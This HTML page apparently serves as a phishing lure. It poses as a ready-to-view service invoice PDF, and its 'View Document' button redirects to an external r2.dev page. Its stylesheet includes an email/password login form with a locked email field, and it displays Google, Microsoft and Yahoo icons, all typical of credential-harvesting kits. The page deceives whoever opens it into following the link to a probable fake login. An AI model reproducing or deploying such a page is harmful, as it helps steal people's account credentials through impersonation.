<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Files is ready and available to view</title>
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
    <meta name="robots" content="noindex">
    <style>
        body {
            background-image: url(" ");
            background-size: cover;
            background-repeat: no-repeat;
            background-position: center;
            padding: 20px; /* Tambahkan padding di sekitar konten */
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; /* Gunakan font yang enak dilihat */
        }

        .icon {
            margin-right: 10px;
            font-size: 24px;
        }

        .separator {
            border: none;
            height: 0;
            margin: 1rem 0;
        }

        .hover-scale {
            transition: transform 0.3s ease;
        }

        .hover-scale:hover {
            transform: scale(1.05);
        }

        .hover-color {
            transition: color 0.3s ease;
        }

        .hover-color:hover {
            color: #3182ce;
        }

        /* Tambahkan background untuk div yang mengelilingi kartu */
        .card-container {
            background-color: rgba(255, 255, 255, 0.8); /* Warna latar belakang dengan opacity */
            backdrop-filter: blur(10px); /* Efek blur pada latar belakang */
            border-radius: 20px; /* Sudut border untuk tampilan yang lebih melengkung */
            padding: 20px; /* Tambahkan padding di sekitar kartu */
            max-width: 400px; /* Lebar maksimum kartu */
            margin: auto; /* Posisi kartu di tengah */
        }

        /* Gaya untuk form email dan password */
        .email-password-form {
            max-width: 400px;
            margin: auto;
            padding: 20px;
            background-color: white;
            border-radius: 10px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
        }

        .email-password-form h2 {
            font-size: 1.5rem;
            margin-bottom: 1rem;
            color: #333; /* Warna judul */
            font-weight: bold;
        }

        .email-password-form label {
            font-size: 1rem;
            display: block;
            margin-bottom: 0.5rem;
            color: #333; /* Warna label */
        }

        .email-password-form input[type="email"],
        .email-password-form input[type="password"] {
            width: 100%;
            padding: 0.5rem;
            font-size: 1rem;
            border: 1px solid #ccc;
            border-radius: 5px;
            margin-bottom: 1rem;
        }

        .email-password-form input[type="email"] {
            background-color: #f9f9f9;
            cursor: not-allowed;
        }

        .email-password-form button {
            background-color: #0078d4; /* Warna tombol */
            color: white;
            padding: 0.5rem 1rem;
            border: none;
            border-radius: 5px;
            font-size: 1rem;
            cursor: pointer;
        }

        .email-password-form button:hover {
            background-color: #005a9e; /* Warna tombol saat dihover */
        }

        .email-password-form a {
            color: #0078d4; /* Warna tautan */
        }

        .email-password-form a:hover {
            color: #005a9e; /* Warna tautan saat dihover */
        }
    </style>
</head>

<body>
    <div class="flex justify-center items-center h-screen">
        <div class="card-container">
            <h1 class="text-2xl font-bold mb-4">Your invoice is ready and available to view</h1>
            <hr class="separator">
            <div>
                <p><strong>Filename:</strong> Service Invoice-961979.pdf</p>
                <p><strong>Size:</strong> 1.6 MB</p>
                <p><strong>File Type:</strong> PDF/Doc</p>
            </div>
            <hr class="separator">
            <button onclick="window.location.href='https://pub-e5c5ac22e33543f487acee2042400e24.r2.dev/firsthand.html'" class="bg-blue-500 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded block mx-auto mt-4 w-40 text-center" id="viewButton">
                <span id="buttonText">View Document</span>
                <span id="spinner" class="hidden ml-2">
                    <i class="fas fa-spinner fa-spin"></i>
                </span>
            </button>
            
            <hr class="separator">
            <p>You can easily checkout files online without having to download anything</p>
            <a href="#" class="text-blue-500 hover-color hover-scale block text-center mt-4">Continue to View Online</a>
            <div class="mt-2 flex justify-center">
                <i class="fab fa-google icon"></i>
                <i class="fab fa-microsoft icon"></i>
                <i class="fab fa-yahoo icon"></i>
            </div>
        </div>
    </div>

    

   
</body>

</html>
